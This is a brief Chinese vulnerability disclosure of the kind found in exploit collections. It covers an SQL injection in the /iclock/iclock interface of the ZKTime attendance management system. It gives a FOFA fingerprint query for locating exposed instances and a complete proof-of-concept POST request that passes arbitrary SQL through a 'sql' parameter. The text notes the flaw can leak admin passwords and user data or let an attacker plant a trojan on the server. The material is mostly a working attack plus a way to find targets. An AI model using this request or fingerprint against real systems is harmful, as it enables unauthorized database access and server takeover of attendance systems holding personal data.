## ZKTime-熵基智能考勤管理系统-ic1ock-SQL注入漏洞

## 一、漏洞简介
01漏洞概述
ZKTime 熵基智能考勤管理系统 ic1ock 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。02搜索引擎

## fofa
```
body="/media/images/ZKECO16.ico"
```

## POC
```
POST /iclock/iclock HTTP/1.1
Host: [已模糊处理]
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 69

submit=NE6%89%A7%E8%A1%8C+SQL+%E8%AF%AD%E5%8F%A5&sql=select+version()
```
